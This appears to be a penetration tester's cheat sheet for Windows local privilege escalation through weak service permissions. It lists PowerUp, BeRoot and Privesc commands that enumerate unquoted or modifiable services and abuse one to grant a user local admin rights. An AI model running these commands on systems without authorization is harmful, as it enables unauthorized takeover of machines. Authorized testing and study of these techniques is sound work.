# Local privilege escalation
Focussing on Service issues

#### Privesc check all
https://github.com/enjoiz/Privesc
```
. .\privesc.ps1
Invoke-PrivEsc
```

#### Beroot check all
https://github.com/AlessandroZ/BeRoot
```
./beRoot.exe
```

####  Run powerup check all
https://github.com/HarmJ0y/PowerUp
```
. ./Powerup.ps1
Invoke-allchecks
```

####  Run powerup get services with unqouted paths and a space in their name
```
Get-ServiceUnquoted -Verbose
Get-ModifiableServiceFile -Verbose
```

####  Get services where the current user can write to its binary path or change arguments to the binary
```
Get-ModifiableServiceFile -Verbose
```

#### Get the services whose configuration current user can modify.
```
Get-ModifiableService -Verbose
```

####  Abuse service to get local admin permissions with powerup
```
Invoke-ServiceAbuse
Invoke-ServiceAbuse -Name '<SERVICE NAME>' -UserName '<DOMAIN>\<USERNAME>'
```
